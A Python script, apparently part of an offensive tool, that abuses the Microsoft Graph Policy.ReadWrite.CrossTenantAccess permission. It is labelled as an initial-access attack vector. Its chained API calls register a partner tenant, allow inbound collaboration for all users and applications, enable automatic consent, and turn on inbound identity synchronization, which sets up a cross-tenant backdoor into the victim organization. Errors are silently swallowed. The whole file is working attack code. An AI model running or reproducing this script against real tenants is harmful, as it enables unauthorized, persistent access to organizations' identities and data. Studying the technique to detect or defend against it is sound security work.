import requests
import colorama
from colorama import Fore, Style


def CrossTenant_Vectors(request_headers, CrossTenantSettings):
    print()
    print(
        "Policy.ReadWrite.CrossTenantAccess - Allows the app to read and write your organization's cross tenant access policies without a signed-in user.")
    print()
    try:
        print("Attack vector - initial access")

        create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners"
        message_obj = {
            "tenantId": CrossTenantSettings["tenantId"]
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

        if result.status_code == 201:
            create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + \
                                 CrossTenantSettings["tenantId"]
            message_obj = {
                "b2bCollaborationInbound": {
                    "usersAndGroups": {"accessType": "allowed",
                                       "targets": [{"target": "AllUsers", "targetType": "user"}]},
                    "applications": {"accessType": "allowed",
                                     "targets": [{"target": "AllApplications", "targetType": "application"}]}
                }
            }

            result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

            if result.status_code == 204:
                create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + \
                                     CrossTenantSettings["tenantId"]
                message_obj = {
                    "inboundTrust": {},
                    "automaticUserConsentSettings": {"inboundAllowed":"true"}
                }

                result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

                if result.status_code == 204:
                    create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + \
                                         CrossTenantSettings["tenantId"] + "/identitySynchronization"
                    message_obj = {
                        "userSyncInbound": {"isSyncAllowed": "true"}
                    }
                    result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

                    if result.status_code == 204:

                        print(Fore.GREEN + "Setup cross tenant synchronization. ")
                        print(Style.RESET_ALL)

    except:
        pass
